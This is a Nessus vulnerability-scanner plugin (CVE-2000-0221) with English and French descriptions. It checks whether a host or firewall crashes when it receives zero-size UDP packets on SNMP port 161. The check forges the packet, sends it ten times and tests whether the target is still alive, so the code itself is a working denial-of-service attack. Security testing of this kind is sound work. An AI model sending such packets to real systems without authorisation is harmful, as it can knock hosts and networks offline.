#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Thanks to Christophe Grenier <grenier@esiea.fr> for pointing this out
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10266);
 script_bugtraq_id(1009);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2000-0221");
 name["english"] = "UDP null size going to SNMP DoS";
 name["francais"] = "Déni de service par paquet UDP de taille nulle allant SNMP";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to
crash either the remote host or the firewall
in between us and the remote host by sending
an UDP packet of null size going to port 161 (snmp)

This flaw may allow an attacker to shut down
your network.

Solution : contact your firewall vendor if
it was the firewall which crashed, or filter
incoming UDP traffic if the remote host crashed.

Risk factor : High";


 desc["francais"] = "Il s'est avéré possible
de faire planter le système distant ou le firewall
situé entre nous et le système distant en envoyant
un paquet UDP de taille nulle allant vers le port 161
(snmp)

Ce problème peut permettre à un pirate de mettre
hors d'état de marche tout votre réseau. 


Solution : contactez l'éditeur du firewall pour
un patch si c'est celui-ci qui a planté, ou alors
filtrez le traffic UDP si c'est la machine distante
qui a planté.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host by sending a null UDP packet";
 summary["francais"] = "Plante le serveur distant en envoyant un packet UDP de taille nulle";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#

start_denial();


ip = forge_ip_packet(ip_v   : 4,
		     ip_hl  : 5,
		     ip_tos : 0,
		     ip_id  : 0x4321,
		     ip_len : 28,
		     ip_off : 0,
		     ip_p   : IPPROTO_UDP,
		     ip_src : this_host(),
		     ip_ttl : 0x40);

# Forge the UDP packet
	    
udp = forge_udp_packet( ip : ip,
			uh_sport : 1234, uh_dport : 161,
			uh_ulen : 8);		     


#
# Send this packet 10 times
#

send_packet(udp, pcap_active:FALSE) x 10;	

#
# wait
#
sleep(5);

#
# And check...
#
alive = end_denial();
if(!alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_hole(161);
}
